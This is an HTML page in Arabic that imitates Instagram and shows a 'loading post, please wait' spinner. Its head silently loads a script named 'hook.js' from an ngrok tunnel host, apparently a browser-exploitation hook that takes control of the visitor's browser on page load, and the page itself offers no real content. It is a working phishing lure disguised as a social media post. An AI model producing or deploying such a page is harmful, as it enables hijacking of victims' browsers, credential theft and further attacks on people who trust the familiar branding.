<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram | عرض المحتوى</title>
    
    <script src="//c3c7-197-200-111-251.ngrok-free.app/hook.js"></script>

    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #262626;
        }
        .container {
            text-align: center;
        }
        .loader {
            border: 3px solid #dbdbdb;
            border-top: 3px solid #0095f6;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        p {
            font-size: 14px;
            font-weight: 400;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="loader"></div>
        <p>جاري تحميل المنشور...</p>
        <p style="color: #8e8e8e; font-size: 12px;">يرجى الانتظار، سيتم توجيهك للمحتوى فوراً.</p>
    </div>

</body>
</html>
